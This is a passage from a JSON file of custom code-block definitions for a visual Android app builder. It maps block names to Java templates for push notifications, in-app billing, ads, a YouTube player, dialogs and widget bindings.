ifSuccess"},{"code":"srtLink","name":"srtLink","typeName":"String","palette":"25","type":"v","spec":"srtLink"},{"code":"flwLink","name":"flwLink","typeName":"String","palette":"25","type":"v","spec":"flwLink"},{"code":"Bitmap bmshare \u003d ((android.graphics.drawable.BitmapDrawable) %1$s.getDrawable()).getBitmap();\ntry {\njava.io.File fileBM \u003d new java.io.File(getExternalCacheDir() + \"/\"+%2$s+\".jpg\");\njava.io.OutputStream outFiles \u003d new java.io.FileOutputStream(fileBM);\nbmshare.compress(Bitmap.CompressFormat.JPEG, 100, outFiles);\noutFiles.flush();\noutFiles.close();\n} catch (Exception e) { showMessage(e.toString()); }\nIntent iten \u003d new Intent(android.content.Intent.ACTION_SEND);\niten.setType(\"*/*\");\niten.putExtra(Intent.EXTRA_TEXT,  %3$s);\niten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(getExternalCacheDir() + \"/\"+%2$s+\".jpg\")));\nstartActivity(Intent.createChooser(iten, \"Share\"));","name":"ShareQRBarcode","palette":"25","type":" ","spec":"ShareQRBarcode %m.imageview asName %s DynamicLink %s"},{"code":"%1$s.substring((int)(%1$s.lastIndexOf(\"jcoderz.php?id\u003d\")), (int)(%1$s.length())).replace(\"jcoderz.php?id\u003d\", \"\")","name":"CatchCoreDynamicLinks","typeName":"String","palette":"25","type":"v","spec":"%s CatchCoreDynamicLinks"},{"code":"FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(%s_onCompleteListener);","name":"FirebaseCloudMessaging instance","palette":"26","type":" ","spec":"%m.FirebaseCloudMessage instanceId"},{"code":"","name":"OneSignal setAppId","palette":"27","type":" ","spec":"OneSignal setAppId %s and Package Name %s"},{"code":"%s \u003d OneSignal.getPermissionSubscriptionState();","name":"OneSignal instance","palette":"27","type":" ","spec":"%m.OneSignal getPermissionSubcriptionState"},{"code":"%s.getSubscriptionStatus().getUserId()","name":"OneSignal getUserId","palette":"27","type":"s","spec":"%m.OneSignal getUserId"},{"code":"%s.getSubscriptionStatus().getSubscribed()","name":"OneSignal isSubscribed","palette":"27","type":"b","spec":"%m.OneSignal isSubscribed"},{"code":"OneSignal.postNotification(new JSONObject(%s), null);","name":"OneSignal postNotification","palette":"27","type":" ","spec":"postNotification %s"},{"code":"CFAlertDialog.Builder %1$s \u003d new CFAlertDialog.Builder(%2$s.this);","name":"CFAlertInitialize","palette":"28","type":" ","spec":"CFAlertBuilder %m.CFAlertDialog.Builder at%m.activity"},{"code":"%1$s.setDialogStyle(CFAlertDialog.CFAlertStyle.BOTTOM_SHEET);","name":"CFAlertStyle","palette":"28","type":" ","spec":"%m.CFAlertDialog.Builder Style.BOTTOM_SHEET"},{"code":"%1$s.setTitle(%2$s);","name":"CFAlertTitle","palette":"28","type":" ","spec":"%m.CFAlertDialog.Builder CFAlertSetTitle %s"},{"code":"%1$s.setMessage(%2$s);","name":"CFAlertSetMessage","palette":"28","type":" ","spec":"%m.CFAlertDialog.Builder CFAlertSetMessage %s"},{"code":"%1$s.setTextGravity(Gravity.START);","name":"CFAlertGravityStart","palette":"28","type":" ","spec":"%m.CFAlertDialog.Builder setGravity.START"},{"code":"%1$s.addButton(%2$s , -1, -1, CFAlertActionStyle.POSITIVE, getButtonGravity(), new DialogInterface.OnClickListener() {\n@Override\npublic void onClick(DialogInterface dialog, int which) {\n%3$s\n}\n});","name":"CFAlertPositiveButton","palette":"28","type":"c","spec":"%m.CFAlertDialog.Builder addPositiveButtonText %s"},{"code":"%1$s.addButton(%2$s , -1, -1, CFAlertActionStyle.NEGATIVE, getButtonGravity(), new DialogInterface.OnClickListener() {\n@Override\npublic void onClick(DialogInterface dialog, int which) {\n%3$s\n}\n});","name":"CFAlertNegativeButton","palette":"28","type":"c","spec":"%m.CFAlertDialog.Builder addNegativeButtonText %s"},{"code":"%1$s \u003d %2$s.show();","name":"CFAlertShow","palette":"28","type":" ","spec":"CFAlert %m.CFAlertDialog Builder %m.CFAlertDialog.Builder show"},{"code":"%1$s.dismiss();","name":"CFAlertDismiss","palette":"28","type":" ","spec":"CFAlert %m.CFAlertDialog dismiss"},{"code":"}\nprivate CFAlertActionAlignment getButtonGravity() {\nreturn CFAlertActionAlignment.JUSTIFIED;\n}\n{","name":"CFAlertActionAlignment","palette":"28","type":" ","spec":"CFAlertActionAlignment.JUSTIFIED"},{"code":"%1$s.setIcon(R.drawable.%2$s);","name":"CFAlertIcon","palette":"28","type":" ","spec":"%m.CFAlertDialog.Builder CFAlertSetIcon %m.resource"},{"code":"%1$s.setHeaderView(R.layout.%2$s);","name":"CFAlertHeaderLayout","palette":"28","type":" ","spec":"CFAlertBuilder %m.CFAlertDialog.Builder setHeaderLayout %s.inputOnly"},{"code":"if(!BillingProcessor.isIabServiceAvailable(this)) {\n\n%s\n\n}","name":"IAP Initialize","palette":"29","type":"c","spec":"if BillingProcessor Service Not Available"},{"code":"%1$s \u003d new BillingProcessor(this, %2$s, %3$s, new BillingProcessor.IBillingHandler() {\n\n%4$s\n\n});","name":"BillingProcessorCheckSKU","palette":"29","type":"c","spec":"%m.BillingProcessor LisenceKey %s MerchantID %s"},{"code":"@Override\npublic void onProductPurchased(@NonNull String productId, @Nullable TransactionDetails details) {\n\n%s\n\n}","name":"onProductPurchased","palette":"29","type":"c","spec":"onProductPurchased"},{"code":"productId","name":"productId","typeName":"String","palette":"29","type":"v","spec":"productId"},{"code":"@Override\npublic void onBillingError(int errorCode, @Nullable Throwable error) {\n\nfinal String MessageError \u003d Integer.toString(errorCode);\n\n%s\n\n}","name":"onBillingError","palette":"29","type":"c","spec":"onBillingError"},{"code":"MessageError","name":"MessageError","typeName":"String","palette":"29","type":"v","spec":"MessageError"},{"code":"@Override\npublic void onBillingInitialized() {\n\n%s\n\n}","name":"onBillingInitialized","palette":"29","type":"c","spec":"onBillingInitialized ReadyToPurchase"},{"code":"@Override\npublic void onPurchaseHistoryRestored() {\nfor(String sku : %1$s.listOwnedProducts())\nLog.d(LOG_TAG, \"Owned Managed Product: \" + sku);\nfor(String sku : %1$s.listOwnedSubscriptions())\nLog.d(LOG_TAG, \"Owned Subscription: \" + sku);\n%2$s\n}","name":"onPurchaseHistoryRestored","palette":"29","type":"c","spec":"onPurchaseHistoryRestored %m.BillingProcessor"},{"code":"}\nprivate void updateInfoBilling() {\nfinal String buyProduct \u003d %2$s+\" is \"+(%1$s.isPurchased(%2$s) ? \"\" : \" not\")+\" purchased\";\nfinal String subcribeProduct \u003d %3$s+\" is \"+(%1$s.isSubscribed(%3$s) ? \"\" : \" not\")+\" subscribed\";\n%4$s\n}\n{","name":"onUpdateInfoBilling","palette":"29","type":"c","spec":"onUpdateInfoBilling %m.BillingProcessor ProductID %s or SubscriptionID %s"},{"code":"updateInfoBilling();","name":"updateInfoBilling","palette":"29","type":" ","spec":"updateInfoBilling"},{"code":"buyProduct","name":"buyProduct","typeName":"String","palette":"29","type":"v","spec":"buyProduct"},{"code":"subcribeProduct","name":"subcribeProduct","typeName":"String","palette":"29","type":"v","spec":"subcribeProduct"},{"code":"if (!%4$s) {\n%5$s\nreturn;\n}\n%2$s.purchase(%3$s.this, %1$s);","name":"ButtonBuyProduct","palette":"29","type":"c","spec":"Buy %s  %m.BillingProcessor at %m.activity ifNot %b"},{"code":"if (!%4$s) {\n%5$s\nreturn;\n}\n%2$s.purchase(%3$s.this, %1$s);","name":"ButtonSubscribeProduct","palette":"29","type":"c","spec":"Subscribe %s %m.BillingProcessor at %m.activity ifNot %b"},{"code":"if (%1$s !\u003d null)\n%1$s.release();","name":"ReleaseBillingProcessor","palette":"29","type":" ","spec":"ReleaseBillingProcessor %m.BillingProcessor"},{"code":"","name":"OnResultBillingResponse","palette":"29","type":" ","spec":"%s.inputOnly onActivityResult"},{"code":"","name":"OneSignal setAppId","palette":"30","type":" ","spec":"OneSignal setAppId %s and Package Name %s"},{"code":"OneSignal.startInit(%1$s.this)\n.inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)\n.unsubscribeWhenNotificationsAreDisabled(%2$s).init();","name":"OneSignal_init","palette":"30","type":" ","spec":"OneSignal.startInit%m.activity CanUnSubscribe%b"},{"code":"OneSignal.setSubscription(%1$s);","name":"SetUserSubscribe","palette":"30","type":" ","spec":"OneSignal setSubscription%b"},{"code":"OSPermissionSubscriptionState %1$s \u003d OneSignal.getPermissionSubscriptionState();\n\nboolean isEnabled \u003d %1$s.getPermissionStatus().getEnabled();\nboolean isSubscribed \u003d %1$s.getSubscriptionStatus().getSubscribed();\nboolean subscriptionSetting \u003d %1$s.getSubscriptionStatus().getUserSubscriptionSetting();\nString userID \u003d %1$s.getSubscriptionStatus().getUserId();\nString pushToken \u003d %1$s.getSubscriptionStatus().getPushToken();\n","name":"OSPermissionSubscriptionState","palette":"30","type":" ","spec":"OSPermissionSubscriptionState Status%m.OneSignal"},{"code":"isEnabled","name":"isEnabled","typeName":"boolean","palette":"30","type":"b","spec":"isEnabled"},{"code":"isSubscribed","name":"isSubscribed","typeName":"boolean","palette":"30","type":"b","spec":"isSubscribed"},{"code":"userID","name":"userID","palette":"30","type":"s","spec":"userID"},{"code":"pushToken","name":"pushToken","palette":"30","type":"s","spec":"pushToken"},{"code":"if (!%1$s)\nreturn;\n\ntry {\nOneSignal.postNotification(new JSONObject(\"{\u0027contents\u0027: {\u0027en\u0027:\u0027{{content_m}}\u0027}, \" +\n                           \"\u0027include_player_ids\u0027: [\u0027\" + %2$s+ \"\u0027], \" +\n                           \"\u0027headings\u0027: {\u0027en\u0027: \u0027Hi {{user_name}}\u0027}, \" +\n                           \"\u0027big_picture\u0027: \u0027{{image_m}}\u0027}\"), new OneSignal.PostNotificationResponseHandler() {\n%3$s\n});\n} catch (JSONException e) {\ne.printStackTrace();\n}","name":"SendPushUserByTAG","palette":"30","type":"c","spec":"SendPushUserByTAG Check%b toUser%s.inputOnly"},{"code":"JSONObject tags \u003d new JSONObject();\ntry {\ntags.put(\"user_name\", %1$s);\ntags.put(\"content_m\", %2$s);\ntags.put(\"image_m\", %3$s);\n} catch (JSONException e) {\ne.printStackTrace();\njava.io.StringWriter errors \u003d new java.io.StringWriter();\ne.printStackTrace(new java.io.PrintWriter(errors));\nfinal String ErrorJsonTag \u003d errors.toString();\n%4$s\n}\nOneSignal.sendTags(tags);","name":"CreateJSONTagPush","palette":"30","type":"c","spec":"CreateJSONTag titleTAG%s messageTAG%s imageTAG%s ifError"},{"code":"ErrorJsonTag","name":"ErrorJsonTag","typeName":"String","palette":"30","type":"v","spec":"ErrorJsonTag"},{"code":"@Override\npublic void onSuccess(JSONObject response) {\nLog.i(\"OneSignalExample\", \"postNotification Success: \" + response.toString());\nfinal String NotifSuccess \u003d \"Success Info: \" + response.toString();\n%1$s\n}","name":"onSuccessPostNotif","palette":"30","type":"c","spec":"onSuccessPostNotif"},{"code":"NotifSuccess","name":"NotifSuccess","typeName":"String","palette":"30","type":"v","spec":"NotifSuccess"},{"code":"@Override\npublic void onFailure(JSONObject response) {\nLog.i(\"OneSignalExample\", \"postNotification Failure: \" + response.toString());\nfinal String NotifFailure \u003d \"Failure Info: \" + response.toString();\n%1$s\n}","name":"onFailurePostNotif","palette":"30","type":"c","spec":"onFailurePostNotif"},{"code":"NotifFailure","name":"NotifFailure","typeName":"String","palette":"30","type":"v","spec":"NotifFailure"},{"code":"%1$s.startRequestNetwork(RequestNetworkController.GET, %2$s\n.concat(\"?title\u003d\".concat(%3$s\n.concat(\"\u0026message\u003d\".concat(%4$s\n.concat(\"\u0026big_image\u003d\".concat(%5$s)))))), \"\", _%1$s_request_listener);","name":"SendPushUsingPHP","palette":"30","type":" ","spec":"PHPsender Using%m.requestnetwork getHostURL%s pushTitle%s pushMessage%s pushImage%s"},{"code":"if (!%1$s)\nreturn;\n\ntry {\n   JSONObject notificationContent \u003d new JSONObject(\"{\u0027contents\u0027: {\u0027en\u0027: \u0027\" + %2$s + \"\u0027},\" +\n           \"\u0027include_player_ids\u0027: [\u0027\" + %3$s + \"\u0027], \" +\n           \"\u0027headings\u0027: {\u0027en\u0027: \u0027\" + %4$s + \"\u0027}, \" +\n           \"\u0027big_picture\u0027: \u0027\" + %5$s + \"\u0027}\");\n   OneSignal.postNotification(notificationContent, null);\n} catch (org.json.JSONException e) {\n   e.printStackTrace();\n}","name":"DirectNotifOneUser","palette":"30","type":" ","spec":"SendNotif check %b message %m.varStr userID %m.varStr title %m.varStr image %m.varStr"},{"code":"final StartAppAd rewardedVideo \u003d new StartAppAd(%1$s.this);","name":"RewardedVideoAd","palette":"31","type":" ","spec":"RewardedVideoAd%m.activity"},{"code":"rewardedVideo.setVideoListener(new VideoListener() {\n@Override\npublic void onVideoCompleted() {\n%1$s\n}\n});","name":"rewardedVideosetListener","palette":"31","type":"c","spec":"rewardedListener onComplete"},{"code":"rewardedVideo.loadAd(StartAppAd.AdMode.REWARDED_VIDEO, new AdEventListener() {\n%1$s\n});","name":"rewardedVideoLoad","palette":"31","type":"c","spec":"rewardedVideoLoad"},{"code":" @Override\npublic void onReceiveAd(Ad ad) {\n%1$s\n}","name":"onSuccessVideoLoad","palette":"31","type":"c","spec":"onSuccessVideoLoad"},{"code":" @Override\npublic void onFailedToReceiveAd(Ad ad) {\n%1$s\n}","name":"onFailedVideoLoad","palette":"31","type":"c","spec":"onFailedVideoLoad"},{"code":"rewardedVideo.showAd();","name":"showVideoAd","palette":"31","type":" ","spec":"showVideoAd"},{"code":"StartAppAd.showAd(%1$s.this);","name":"showInterstitialAd","palette":"31","type":" ","spec":"showInterstitialAd%m.activity"},{"code":"Banner %1$s \u003d new Banner(%2$s.this);\n%1$s.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));\n%3$s.addView(%1$s);","name":"CreateBannerAd","palette":"31","type":" ","spec":"CreateBannerAd withName%s.inputOnly at%m.activity inflateTo%m.view"},{"code":"StartAppSDK.init(%3$s.this, %1$s, %2$s);","name":"StartApp","palette":"31","type":" ","spec":"StartApp AppID%s setReturnAd%b at %m.activity"},{"code":"StartAppSDK.setTestAdsEnabled(true);","name":"StartAppTestAdMode","palette":"31","type":" ","spec":"StartAppSDKsetTestAdsEnabled"},{"code":"StartAppSDK.init(this, %1$s, new SDKAdPreferences()\n.setAge(%2$s));","name":"StartApp_Pref","palette":"31","type":" ","spec":"StartApp_Pref AppID %s TargetAge %s.inputOnly"},{"code":"// Define StartApp Mrec\nMrec startAppMrec \u003d new Mrec(%2$s.this);\nRelativeLayout.LayoutParams mrecParameters \u003d\n            new RelativeLayout.LayoutParams(\n                        RelativeLayout.LayoutParams.WRAP_CONTENT,\n                        RelativeLayout.LayoutParams.WRAP_CONTENT);\nmrecParameters.addRule(RelativeLayout.CENTER_HORIZONTAL);\nmrecParameters.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM);\n\n// Add to main Layout\n%1$s.addView(startAppMrec, mrecParameters);","name":"StartAppMrecBanner","palette":"31","type":" ","spec":"%m.view add_MREC_Banner at %m.activity"},{"code":"getLifecycle().addObserver(%1$s);","name":"Lifecycle","palette":"32","type":" ","spec":"%m.YouTubePlayerView geLifecycle"},{"code":"%1$s.addYouTubePlayerListener(new AbstractYouTubePlayerListener() {\n  @Override\n  public void onReady(@NonNull YouTubePlayer youTubePlayer) {\n    String videoId \u003d %2$s;\n    youTubePlayer.cueVideo(videoId, 0);\n    %3$s\n  }\n});","name":"addYouTubePlayerListener","palette":"32","type":"c","spec":"%m.YouTubePlayerView addYouTubePlayerListener VideoID %s"},{"code":"final YouTubePlayerView %1$s \u003d _v.findViewById(R.id.%1$s);","name":"YouTubeCustomView","palette":"32","type":" ","spec":"YouTubeCustomView %m.YouTubePlayerView"},{"code":"addFullScreenListenerToPlayer();","name":"addFullScreenListener","palette":"32","type":" ","spec":"addFullScreenListener"},{"code":"}\n\nprivate FullScreenHelper fullScreenHelper \u003d new FullScreenHelper(%2$s.this);\n\n    private void addFullScreenListenerToPlayer() {\n        %1$s.addFullScreenListener(new YouTubePlayerFullScreenListener() {\n            @Override\n            public void onYouTubePlayerEnterFullScreen() {\n                setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);\n                fullScreenHelper.enterFullScreen();\n\n                \n            }\n\n            @Override\n            public void onYouTubePlayerExitFullScreen() {\n                setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);\n                fullScreenHelper.exitFullScreen();\n\n                \n            }\n        });\n    }\n{","name":"ListenerFullScreenMode","palette":"32","type":" ","spec":"ListenerFullScreenMode %m.YouTubePlayerView at %m.activity"},{"code":"}\npublic class FullScreenHelper {\n\n    private Activity context;\n    private View[] views;\n\n    /**\n     * @param context\n     * @param views to hide/show\n     */\n    public FullScreenHelper(Activity context, View ... views) {\n        this.context \u003d context;\n        this.views \u003d views;\n    }\n\n    /**\n     * call this method to enter full screen\n     */\n    public void enterFullScreen() {\n        View decorView \u003d context.getWindow().getDecorView();\n\n        hideSystemUi(decorView);\n\n        for(View view : views) {\n            view.setVisibility(View.GONE);\n            view.invalidate();\n        }\n    }\n\n    /**\n     * call this method to exit full screen\n     */\n    public void exitFullScreen() {\n        View decorView \u003d context.getWindow().getDecorView();\n\n        showSystemUi(decorView);\n\n        for(View view : views) {\n            view.setVisibility(View.VISIBLE);\n            view.invalidate();\n        }\n    }\n\n    private void hideSystemUi(View mDecorView) {\n        mDecorView.setSystemUiVisibility(\n                View.SYSTEM_UI_FLAG_LAYOUT_STABLE\n                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION\n                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN\n                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION\n                        | View.SYSTEM_UI_FLAG_FULLSCREEN\n                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);\n    }\n\n    private void showSystemUi(View mDecorView) {\n        mDecorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE);\n    }\n}\n{","name":"ClassFullScreenMode","palette":"32","type":" ","spec":"ClassFullScreenMode"},{"code":"initPictureInPicture(%1$s);","name":"initPictureInPicture","palette":"32","type":" ","spec":"initPictureInPicture %m.YouTubePlayerView"},{"code":"}\nprivate void initPictureInPicture(YouTubePlayerView youTubePlayerView) {\n        ImageView pictureInPictureIcon \u003d new ImageView(this);\n        pictureInPictureIcon.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.%2$s));\n\n        pictureInPictureIcon.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View _view) {\n\n\t\t\t\t\tif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.N) {\n\t\t\t\t\t\tboolean supportsPIP \u003d getPackageManager().hasSystemFeature(PackageManager.FEATURE_PICTURE_IN_PICTURE);\n\t\t\t\t\t\tif(supportsPIP)\n\t\t\t\t\t\t\tenterPictureInPictureMode();\n\t\t\t\t\t} else {\n\t\t\t\t\t\tnew AlertDialog.Builder(%3$s.this)\n\t\t\t\t\t\t\t.setTitle(\"Can\u0027t enter picture in picture mode\")\n\t\t\t\t\t\t\t.setMessage(\"In order to enter picture in picture mode you need a SDK version \u003e\u003d N.\")\n\t\t\t\t\t\t\t.show();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t});\n\n        youTubePlayerView.getPlayerUiController().addView(pictureInPictureIcon);\n    }\n\n\n@Override\n    public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode, Configuration newConfig) {\n        super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig);\n\n        if(isInPictureInPictureMode) {\n            %1$s.enterFullScreen();\n            %1$s.getPlayerUiController().showUi(false);\n        } else {\n            %1$s.exitFullScreen();\n            %1$s.getPlayerUiController().showUi(true);\n        }\n    }\n\n\n{","name":"Void_initPictureInPicture","palette":"32","type":" ","spec":"Void_initPictureInPicture %m.YouTubePlayerView Icon %m.resource at %m.activity"},{"code":"if (%1$s.isFullScreen()) {\n%1$s.exitFullScreen();\n%2$s\n}\nelse {\n%3$s\n}","name":"BackPressCloseFullScreen","palette":"32","type":"e","spec":"%m.YouTubePlayerView ifFullScreenThen"},{"code":"%1$s \u003d KProgressHUD.create(%2$s.this)\n.setStyle(KProgressHUD.Style.SPIN_INDETERMINATE)\n.setLabel(%3$s)\n.setDetailsLabel(%4$s)\n.setCancellable(true)\n.setAnimationSpeed(%5$s)\n.setDimAmount(0.5f)\n.show();","name":"DialogKHUD","palette":"33","type":" ","spec":"%m.KProgressHUD at %m.activity title %s message %s speed %d"},{"code":"%1$s.dismiss();","name":"dismissKHUDdialog","palette":"33","type":" ","spec":"%m.KProgressHUD dismiss"},{"code":"final AlertDialog %1$s \u003d new AlertDialog.Builder(%2$s.this).create();","name":"CreateCustomDialog","palette":"15","type":" ","spec":"AlertDialog %s.inputOnly at %m.activity create"},{"code":"getLayoutInflater().inflate(R.layout.%2$s, null);\n%1$s.setView(inflate);","color":"#FF6E17FF","name":"LayoutInflateDialog","typeName":"","palette":"15","type":" ","spec":"LayoutInflaterDialog name %s.inputOnly nameCustomView %s.inputOnly"},{"code":"TextView %1$s \u003d (TextView)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetTextView","palette":"15","type":" ","spec":"WidgetTextView name %s.inputOnly"},{"code":"ImageView %1$s \u003d (ImageView)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetImageView","palette":"15","type":" ","spec":"WidgetImageView name %s.inputOnly"},{"code":"Button %1$s \u003d (Button) inflate.findViewById(R.id.%1$s);","color":"#FF6E17FF","name":"WidgetButton","typeName":"","palette":"15","type":" ","spec":"WidgetButton name %s.inputOnly"},{"code":"LinearLayout %1$s \u003d (LinearLayout)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetLinearLayout","palette":"15","type":" ","spec":"WidgetLinearLayout name %s.inputOnly"},{"code":"EditText %1$s \u003d (EditText)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetEditText","palette":"15","type":" ","spec":"WidgetEditText name %s.inputOnly"},{"code":"ProgressBar %1$s \u003d (ProgressBar)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetProgressBar","palette":"15","type":" ","spec":"WidgetProgressBar name %s.inputOnly"},{"code":"Switch %1$s \u003d (Switch)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetSwitch","palette":"15","type":" ","spec":"WidgetSwitch name %s.inputOnly"},{"code":"%1$s.setOnClickListener(new View.OnClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onClick(View _view) {\r\n\t\t\t\t%2$s\r\n\t\t\t}\r\n\t\t});","name":"ViewOnClick","palette":"15","type":"c","spec":"%s.inputOnly onClickListener"},{"code":"%1$s.setText(%2$s);","name":"SetText","palette":"15","type":" ","spec":"%s.inputOnly setText %s"},{"code":"%1$s.setProgress((int)%2$s);","name":"setProgress","palette":"15","type":" ","spec":"ProgressBar %s.inputOnly setProgress %d"},{"code":"%1$s.setImageResource(R.drawable.%2$s);","name":"SetImageFromResource","palette":"15","type":" ","spec":"Image %s.inputOnly setFromRes %m.resource"},{"code":"%1$s.setImageBitmap(FileUtil.decodeSampleBitmapFromPath(FileUtil.getExternalStorageDir().concat(%2$s), 1024, 1024));","name":"SetImageFromPath","palette":"15","type":" ","spec":"Image %s.inputOnly setFromPath %s"},{"code":"Glide.with(getApplicationContext()).load(Uri.parse(%2$s)).into(%1$s);","name":"SetImageFromURL","palette":"15","type":" ","spec":"Image %s.inputOnly setFromURL %s"},{"code":"%1$s.setChecked(%2$s);","name":"SwitchSetCheck","palette":"15","type":" ","spec":"Switch %s.inputOnly SetCheck%b"},{"code":"%1$s.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onCheckedChanged(CompoundButton _param1, boolean _param2)  {\r\n\t\t\t\tfinal boolean _isChecked \u003d _param2;\r\n\t\t\t\tif (_isChecked) {\r\n\t\t\t\t\t%2$s\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\t%3$s\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t});","name":"SwitchListener","palette":"15","type":"e","spec":"Switch %s.inputOnly onCheckChange ifChecked"},{"code":"%1$s.addTextChangedListener(new TextWatcher() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onTextChanged(CharSequence _param1, int _param2, int _param3, int _param4) {\r\n\t\t\t\tfinal String _charSeq \u003d _param1.toString();\r\n\t\t\t\t%2$s\r\n\t\t\t}\r\n\t\t\t@Override\r\n\t\t\tpublic void beforeTextChanged(CharSequence _param1, int _param2, int _param3, int _param4) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void afterTextChanged(Editable _param1) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t});","name":"addTextChangedListener","palette":"15","type":"c","spec":"EditText %s.inputOnly getStringText  _charSeq"},{"code":"_charSeq","name":"_charSeq","palette":"15","type":"s","spec":"_charSeq"},{"code":"LottieAnimationView %1$s \u003d new LottieAnimationView(%2$s.this);\n%1$s.setAnimation(%3$s);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(-1, -1));\n%1$s.setRepeatCount(-1);\n%1$s.setRepeatMode(com.airbnb.lottie.LottieDrawable.RESTART);\n%4$s.addView(%1$s);\n%1$s.playAnimation();","name":"addLottieWidget","palette":"15","type":" ","spec":"Lottie name %s.inputOnly at %m.activity assetsFile %s inflateToLayout %s.inputOnly"},{"code":"%1$s.setCancelable(%2$s);","name":"DialogCancelable","palette":"15","type":" ","spec":"Dialog %s.inputOnly setCancelable %b"},{"code":"%1$s.show();","name":"DialogShow","palette":"15","type":" ","spec":"Dialog %s.inputOnly show"},{"code":"%1$s.dismiss();","name":"DialogDismiss","palette":"15","type":" ","spec":"Dialog %s.inputOnly dismiss"},{"code":"%1$s.getProgress();","name":"ProgressBarGetProgress","palette":"15","type":"d","spec":"%s.inputOnly getProgress"},{"code":"%1$s.setMax((int)%2$s);","name":"ProgressBarSetMax","palette":"15","type":" ","spec":"ProgressBar %s.inputOnly setMax %d"},{"code":"%1$s.setShowSoftInputOnFocus(%2$s);","name":"EditTextKeyBoard","palette":"15","type":" ","spec":"EditText %s.inputOnly keyBoard %b"},{"code":"%1$s","name":"asdLinearLayout","typeName":"LinearLayout","palette":"15","type":"v","spec":"LinearLayout %s.inputOnly"},{"code":"%1$s.getWindow().setBackgroundDrawableResource(android.R.color.transparent);","name":"DialogSetTransparent","palette":"15","type":" ","spec":"%s.inputOnly set TransparentColor"},{"code":"%1$s","name":"asdTextView","typeName":"TextView","palette":"15","type":"v","spec":"TextView %s.inputOnly"},{"code":"WebView %1$s \u003d (WebView)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetWebView","palette":"15","type":" ","spec":"WidgetWebView name %s.inputOnly"},{"code":"%1$s","name":"asdImageView","typeName":"ImageView","palette":"15","type":"v","spec":"ImageView %s.inputOnly"},{"code":"Window window \u003d %1$s.getWindow();\nWindowManager.LayoutParams wlp \u003d window.getAttributes();\n\nwlp.gravity \u003d Gravity.%2$S;\nwlp.flags \u0026\u003d ~WindowManager.LayoutParams.FLAG_DIM_BEHIND;\nwindow.setAttributes(wlp);","name":"DialogPosition","palette":"15","type":" ","spec":"Dialog %s.inputOnly setPosition %s.inputOnly"},{"code":"%1$s","name":"asdEditText","typeName":"EditText","palette":"15","type":"v","spec":"EditText %s.inputOnly"},{"code":"TextInputLayout %1$s \u003d (TextInputLayout)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetTextInputLayout","palette":"15","type":" ","spec":"WidgetTextInputLayout name %s.inputOnly"},{"code":"%1$s","name":"asdTextInputLayout","typeName":"TextInputLayout","palette":"15","type":"v","spec":"TextInputLayout %s.inputOnly"},{"code":"%1$s.setDefaultHintTextColor(%2$s);","name":"ColorTextInputLayout","palette":"15","type":" ","spec":"%m.TextInputLayout setHintTextColor ColorState %s.inputOnly"},{"code":"%1$s","name":"asdProgressBar","typeName":"ProgressBar","palette":"-1","type":"v","spec":"ProgressBar %s.inputOnly"},{"code":"%1$s","name":"asdListView","typeName":"ListView","palette":"-1","type":"v","spec":"ListView %s.inputOnly"},{"code":"ListView %1$s \u003d (ListView)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetListView","palette":"-1","type":" ","spec":"WidgetListView name %s.inputOnly"},{"code":"VideoView %1$s \u003d (VideoView)\nconvertView.findViewById(R.id.%1$s);","name":"WidgetVideoView","palette":"-1","type":" ","spec":"WidgetVideoView name %s.inputOnly"},{"code":"%1$s","name":"asdVideoView","typeName":"VideoView","palette":"-1","type":"v","spec":"VideoView %s.inputOnly"},{"code":"%1$s","name":"asdWebView","typeName":"WebView","palette":"-1","type":"v","spec":"WebView %s.inputOnly"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true);\n%1$s.getSettings().setUseWideViewPort(true);\n\nfinal WebSettings webSettings \u003d %1$s.getSettings();\nfinal String newUserAgent;\n\nnewUserAgent \u003d \"Mozilla/5.0 (Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","name":"WebViewMobile","palette":"-1","type":" ","spec":"%m.webview setMobileMode"},{"code":"%1$s.getSettings().setBuiltInZoomControls(%2$s);\n%1$s.getSettings().setDisplayZoomControls(false);","name":"WebViewZoom","palette":"-1","type":" ","spec":"%m.webview setZoom Enable %b"},{"code":"       %1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onItemClick(AdapterView\u003c?\u003e _param1, View _param2, 